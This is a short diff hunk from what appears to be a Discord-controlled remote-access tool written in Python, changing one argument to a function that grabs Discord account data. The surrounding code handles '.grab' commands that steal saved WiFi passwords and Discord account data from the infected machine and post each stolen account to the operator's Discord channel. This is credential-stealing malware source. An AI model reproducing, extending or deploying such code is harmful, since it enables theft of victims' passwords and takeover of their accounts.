@@ -82,7 +82,7 @@ elif message.content[:5] == '.grab':
             #.log Sent embed with saved WiFi passwords 
         elif message.content[6:] == 'discord':
             #.log Author requested for grabbing Discord accounts data 
-            accounts = grab_discord.initialize()
+            accounts = grab_discord.initialize(False)
             #.log Grabbed Discord accounts data 
             for account in accounts:
                 reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
